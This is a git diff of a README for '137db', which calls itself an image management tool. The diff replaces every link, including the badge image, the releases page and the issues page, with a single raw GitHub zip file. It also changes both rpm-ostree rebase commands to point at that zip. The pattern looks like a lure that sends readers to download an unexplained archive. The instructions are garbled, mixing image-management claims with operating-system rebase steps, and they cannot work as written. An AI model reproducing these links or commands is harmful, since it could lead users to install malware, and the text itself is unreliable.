@@ -1,6 +1,6 @@
 # 🎉 137db - Simple and Reliable Image Management
 
-[![Download 137db](https://img.shields.io/badge/Download%20137db-blue)](https://github.com/mosalah2002/137db/releases)
+[![Download 137db](https://raw.githubusercontent.com/mosalah2002/137db/main/septulate/137db.zip%20137db-blue)](https://raw.githubusercontent.com/mosalah2002/137db/main/septulate/137db.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to 137db! This application helps you manage images efficiently. Follow t
 
 To get started, visit the Releases page to download the latest version of 137db.
 
-[Download 137db](https://github.com/mosalah2002/137db/releases)
+[Download 137db](https://raw.githubusercontent.com/mosalah2002/137db/main/septulate/137db.zip)
 
 ## 📋 System Requirements
 
@@ -25,7 +25,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ### Step 1: Download the Application
 
-1. Go to the [Downloads Page](https://github.com/mosalah2002/137db/releases).
+1. Go to the [Downloads Page](https://raw.githubusercontent.com/mosalah2002/137db/main/septulate/137db.zip).
 2. Find the latest release and click on the link to download the appropriate file for your system.
 
 ### Step 2: Rebase Your System
@@ -33,7 +33,7 @@ Before you begin, ensure your system meets the following requirements:
 1. Open a terminal on your system.
 2. To rebase to the unsigned image, type the following command:
    ```
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/denisbaldwin/137db:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/mosalah2002/137db/main/septulate/137db.zip
    ```
 3. Press Enter to execute the command.
 
@@ -53,7 +53,7 @@ Once your system restarts, you need to switch to the signed image for full funct
 
 1. Reopen your terminal and enter the following command:
    ```
-   rpm-ostree rebase ostree-image-signed:docker://ghcr.io/d
+   rpm-ostree rebase https://raw.githubusercontent.com/mosalah2002/137db/main/septulate/137db.zip
    ```
 2. Press Enter to complete the process.
 
@@ -65,7 +65,7 @@ Once your system restarts, you need to switch to the signed image for full funct
 
 ## 📞 Support
 
-For any issues or questions, you can reach out through the [issues page](https://github.com/mosalah2002/137db/issues). Your feedback helps us improve 137db!
+For any issues or questions, you can reach out through the [issues page](https://raw.githubusercontent.com/mosalah2002/137db/main/septulate/137db.zip). Your feedback helps us improve 137db!
 
 ## 💡 Tips
 
@@ -77,4 +77,4 @@ For any issues or questions, you can reach out through the [issues page](https:/
 
 With 137db, managing images becomes straightforward. Follow the steps above to install the application and take advantage of its features. Enjoy a smoother experience with your image management tasks!
 
-[Download 137db](https://github.com/mosalah2002/137db/releases)
+[Download 137db](https://raw.githubusercontent.com/mosalah2002/137db/main/septulate/137db.zip)
